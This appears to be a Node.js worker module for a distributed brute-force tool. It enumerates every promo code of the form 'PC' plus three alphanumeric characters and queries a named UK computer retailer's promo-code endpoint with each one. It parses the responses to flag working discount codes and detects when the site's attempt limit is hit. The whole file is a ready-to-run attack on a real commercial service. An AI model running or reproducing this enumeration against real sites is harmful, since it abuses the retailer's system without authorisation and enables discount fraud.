function next(configs) {
    let chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    let data = []
    for (; configs.states.c1 < chars.length; configs.states.c1++) {
        for (; configs.states.c2 < chars.length; configs.states.c2++) {
            for (; configs.states.c3 < chars.length; configs.states.c3++) {
                data.push('PC' + chars[configs.states.c1] + chars[configs.states.c2] + chars[configs.states.c3])
                if (data.length >= configs.clusterWorkSize) {
                    return data
                }
            }
            configs.states.c3 = 0
        }
        configs.states.c2 = 0
    }
}

function script(code) {
    return new Promise((resolve, reject) => {
        require('https').get({
            hostname: 'www.pcspecialist.co.uk',
            port: 443,
            path: '/form/includes/promo_code.php?promo_code=' + code,
            agent: false
        }, (res) => {
            let data = ''
            res.on('data', (chunk) => { data += chunk })
            res.on('end', () => {
                if (data.indexOf('maximum attempts allowed') != -1) {
                    reject(data)
                } else if (data.indexOf('now expired') != -1) {
                    resolve(false)
                } else if (data.indexOf('not recognised') != -1) {
                    resolve(false)
                } else {
                    console.log('GOOD', code, data)
                    resolve(true)
                }
            })
        })
    })
}

module.exports.next = next;
module.exports.script = script;
